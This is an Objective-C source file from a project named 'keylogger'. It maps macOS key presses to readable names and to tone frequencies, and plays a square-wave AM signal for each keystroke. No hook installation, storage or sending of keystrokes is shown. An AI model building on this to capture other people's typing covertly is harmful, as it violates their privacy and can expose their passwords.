//
//  Keys.m
//  keylogger
//
//  Created by Michael Colon on 7/15/16.
//  Copyright © 2016 Michael Colon. All rights reserved.
//

#import "amKeys.h"
#import <Carbon/Carbon.h>
#import "syssound.h"

@interface amKeys()
@end

@implementation amKeys

static amKeys * _singleton = nil;

+(amKeys*) sharedKeyLogger {
    if (! _singleton ) _singleton = [[amKeys alloc] init];
    return _singleton;
}

- (id) init {
    if((self = [super init])){
    }
    return self;
}

- (void)handleKeyPress:(NSEvent*)event {
//    NSLog(@"key Code: %@", [self keyCodeConversion:event.keyCode]);
    square_am_signal(0.050, [[self freqForKey:event.keyCode] integerValue]);
    count++;
    
}


- (NSString*)keyCodeConversion:(unsigned short)keyCode {
    
    //Convert keyCode to string (no simple method around this)
    switch (keyCode) {
        case kVK_ANSI_A:                return @"a"; break;
        case kVK_ANSI_S:                return @"s"; break;
        case kVK_ANSI_D:                return @"d"; break;
        case kVK_ANSI_F:                return @"f"; break;
        case kVK_ANSI_H:                return @"h"; break;
        case kVK_ANSI_G:                return @"g"; break;
        case kVK_ANSI_Z:                return @"z"; break;
        case kVK_ANSI_X:                return @"x"; break;
        case kVK_ANSI_C:                return @"c"; break;
        case kVK_ANSI_V:                return @"v"; break;
        case kVK_ANSI_B:                return @"b"; break;
        case kVK_ANSI_Q:                return @"q"; break;
        case kVK_ANSI_W:                return @"w"; break;
        case kVK_ANSI_E:                return @"e"; break;
        case kVK_ANSI_R:                return @"r"; break;
        case kVK_ANSI_T:                return @"t"; break;
        case kVK_ANSI_Y:                return @"y"; break;
        case kVK_ANSI_1:                return @"1"; break;
        case kVK_ANSI_2:                return @"2"; break;
        case kVK_ANSI_3:                return @"3"; break;
        case kVK_ANSI_4:                return @"4"; break;
        case kVK_ANSI_6:                return @"6"; break;
        case kVK_ANSI_5:                return @"5"; break;
        case kVK_ANSI_Equal:            return @"="; break;
        case kVK_ANSI_9:                return @"9"; break;
        case kVK_ANSI_7:                return @"7"; break;
        case kVK_ANSI_Minus:            return @"-"; break;
        case kVK_ANSI_8:                return @"8"; break;
        case kVK_ANSI_0:                return @"0"; break;
        case kVK_ANSI_RightBracket:     return @"]"; break;
        case kVK_ANSI_O:                return @"o"; break;
        case kVK_ANSI_U:                return @"u"; break;
        case kVK_ANSI_LeftBracket:      return @"["; break;
        case kVK_ANSI_I:                return @"i"; break;
        case kVK_ANSI_P:                return @"p"; break;
        case kVK_ANSI_L:                return @"l"; break;
        case kVK_ANSI_J:                return @"j"; break;
        case kVK_ANSI_Quote:            return @"'"; break;
        case kVK_ANSI_K:                return @"k"; break;
        case kVK_ANSI_Semicolon:        return @"a"; break;
        case kVK_ANSI_Backslash:        return @"\\"; break;
        case kVK_ANSI_Comma:            return @","; break;
        case kVK_ANSI_Slash:            return @"/"; break;
        case kVK_ANSI_N:                return @"n"; break;
        case kVK_ANSI_M:                return @"m"; break;
        case kVK_ANSI_Period:           return @"."; break;
        case kVK_ANSI_Grave:            return @"`"; break;
        case kVK_ANSI_KeypadDecimal:    return @"."; break;
        case kVK_ANSI_KeypadMultiply:   return @"*"; break;
        case kVK_ANSI_KeypadPlus:       return @"+"; break;
        case kVK_ANSI_KeypadClear:      return @"<Clear>"; break;
        case kVK_ANSI_KeypadDivide:     return @"/"; break;
        case kVK_ANSI_KeypadEnter:      return @"<Enter>"; break;
        case kVK_ANSI_KeypadMinus:      return @"-"; break;
        case kVK_ANSI_KeypadEquals:     return @"="; break;
        case kVK_ANSI_Keypad0:          return @"0"; break;
        case kVK_ANSI_Keypad1:          return @"1"; break;
        case kVK_ANSI_Keypad2:          return @"2"; break;
        case kVK_ANSI_Keypad3:          return @"3"; break;
        case kVK_ANSI_Keypad4:          return @"4"; break;
        case kVK_ANSI_Keypad5:          return @"5"; break;
        case kVK_ANSI_Keypad6:          return @"6"; break;
        case kVK_ANSI_Keypad7:          return @"7"; break;
        case kVK_ANSI_Keypad8:          return @"8"; break;
        case kVK_ANSI_Keypad9:          return @"9"; break;
            
        case kVK_Return:                return @"<Return>"; break;
        case kVK_Tab:                   return @"<Tab>"; break;
        case kVK_Space:                 return @"<Space>"; break;
        case kVK_Delete:                return @"<Delete>"; break;
        case kVK_Escape:                return @"Escape"; break;
        case kVK_F1:                    return @"F1"; break;
        case kVK_F2:                    return @"F2"; break;
        case kVK_F3:                    return @"F3"; break;
        case kVK_F4:                    return @"F4"; break;
        case kVK_F5:                    return @"F5"; break;
        case kVK_F6:                    return @"F6"; break;
        case kVK_F7:                    return @"F7"; break;
        case kVK_F8:                    return @"F8"; break;
        case kVK_F9:                    return @"F9"; break;
        case kVK_F10:                   return @"F10"; break;
        case kVK_F11:                   return @"F11"; break;
        case kVK_F12:                   return @"F12"; break;
        case kVK_F13:                   return @"F13"; break;
        case kVK_F14:                   return @"F14"; break;
        case kVK_F15:                   return @"F15"; break;
        case kVK_F16:                   return @"F16"; break;
        case kVK_F17:                   return @"F17"; break;
        case kVK_F18:                   return @"F18"; break;
        case kVK_F19:                   return @"F19"; break;
        case kVK_F20:                   return @"F20"; break;
        case kVK_ForwardDelete:         return @"<Delete"; break;
        case kVK_LeftArrow:             return @"<Left Arrow>"; break;
        case kVK_RightArrow:            return @"<Right Arrow>"; break;
        case kVK_DownArrow:             return @"<Down Arrow>"; break;
        case kVK_UpArrow:               return @"<Up Arrow>"; break;
            
        default:
            return @"<Unknown>";
            break;
    }
}

-(NSNumber*) freqForKey:(unsigned short)keyCode {
    
    switch (keyCode) {
        case kVK_ANSI_A:                return @4186; break;
        case kVK_ANSI_S:                return @3951; break;
        case kVK_ANSI_D:                return @3729; break;
        case kVK_ANSI_F:                return @3520; break;
        case kVK_ANSI_H:                return @3322; break;
        case kVK_ANSI_G:                return @3135; break;
        case kVK_ANSI_Z:                return @2953; break;
        case kVK_ANSI_X:                return @2939; break;
        case kVK_ANSI_C:                return @29463; break;
        case kVK_ANSI_V:                return @27923; break;
        case kVK_ANSI_B:                return @2638; break;
        case kVK_ANSI_Q:                return @2563; break;
        case kVK_ANSI_W:                return @2637; break;
        case kVK_ANSI_E:                return @2438; break;
        case kVK_ANSI_R:                return @2216; break;
        case kVK_ANSI_T:                return @2093; break;
        case kVK_ANSI_Y:                return @1975; break;
        case kVK_ANSI_1:                return @1843; break;
        case kVK_ANSI_2:                return @1850; break;
        case kVK_ANSI_3:                return @1776; break;
        case kVK_ANSI_4:                return @2094; break;
        case kVK_ANSI_6:                return @1666; break;
        case kVK_ANSI_5:                return @1845; break;
        case kVK_ANSI_Equal:            return @1864; break;
        case kVK_ANSI_9:                return @1765; break;
        case kVK_ANSI_7:                return @1661; break;
        case kVK_ANSI_Minus:            return @1567; break;
        case kVK_ANSI_8:                return @1392; break;
        case kVK_ANSI_0:                return @1473; break;
        case kVK_ANSI_RightBracket:     return @1396; break;
        case kVK_ANSI_O:                return @587; break;
        case kVK_ANSI_U:                return @493; break;
        case kVK_ANSI_LeftBracket:      return @3348; break;
        case kVK_ANSI_I:                return @338; break;
        case kVK_ANSI_P:                return @2415; break;
        case kVK_ANSI_L:                return @415; break;
        case kVK_ANSI_J:                return @4427; break;
        case kVK_ANSI_Quote:            return @349; break;
        case kVK_ANSI_K:                return @430; break;
        case kVK_ANSI_Semicolon:        return @7202; break;
        case kVK_ANSI_Backslash:        return @6493; break;
        case kVK_ANSI_Comma:            return @3492; break;
        case kVK_ANSI_Slash:            return @9034; break;
        case kVK_ANSI_N:                return @4792; break;
        case kVK_ANSI_M:                return @2884; break;
        case kVK_ANSI_Period:           return @38303; break;
        case kVK_ANSI_Grave:            return @939393; break;
        case kVK_ANSI_KeypadDecimal:    return @2833; break;
        case kVK_ANSI_KeypadMultiply:   return @23402; break;
        case kVK_ANSI_KeypadPlus:       return @22934; break;
        case kVK_ANSI_KeypadClear:      return @373; break;
        case kVK_ANSI_KeypadDivide:     return @223; break;
        case kVK_ANSI_KeypadEnter:      return @1023; break;
        case kVK_ANSI_KeypadMinus:      return @2001; break;
        case kVK_ANSI_KeypadEquals:     return @3021; break;
        case kVK_ANSI_Keypad0:          return @293; break;
        case kVK_ANSI_Keypad1:          return @2393; break;
        case kVK_ANSI_Keypad2:          return @23920; break;
        case kVK_ANSI_Keypad3:          return @22239; break;
        case kVK_ANSI_Keypad4:          return @22390; break;
        case kVK_ANSI_Keypad5:          return @23920; break;
        case kVK_ANSI_Keypad6:          return @2200320; break;
        case kVK_ANSI_Keypad7:          return @203740; break;
        case kVK_ANSI_Keypad8:          return @78390; break;
        case kVK_ANSI_Keypad9:          return @330020; break;
            
        case kVK_Return:                return @89930; break;
        case kVK_Tab:                   return @8034; break;
        case kVK_Space:                 return @34903; break;
        case kVK_Delete:                return @4393; break;
        case kVK_Escape:                return @347820; break;
        case kVK_F1:                    return @348902; break;
        case kVK_F2:                    return @86843; break;
        case kVK_F3:                    return @69799; break;
        case kVK_F4:                    return @59933; break;
        case kVK_F5:                    return @39494; break;
        case kVK_F6:                    return @348003; break;
        case kVK_F7:                    return @39403; break;
        case kVK_F8:                    return @349034; break;
        case kVK_F9:                    return @39493; break;
        case kVK_F10:                   return @34004; break;
        case kVK_F11:                   return @34994; break;
        case kVK_F12:                   return @3403; break;
        case kVK_F13:                   return @39494; break;
        case kVK_F14:                   return @399493; break;
        case kVK_F15:                   return @3994; break;
        case kVK_F16:                   return @56564; break;
        case kVK_F17:                   return @34883; break;
        case kVK_F18:                   return @348480; break;
        case kVK_F19:                   return @39595; break;
        case kVK_F20:                   return @483883; break;
        case kVK_ForwardDelete:         return @3994; break;
        case kVK_LeftArrow:             return @349390; break;
        case kVK_RightArrow:            return @34840; break;
        case kVK_DownArrow:             return @789520; break;
        case kVK_UpArrow:               return @685850; break;
            
        default:
            return @30;
            break;
    }
}

@end
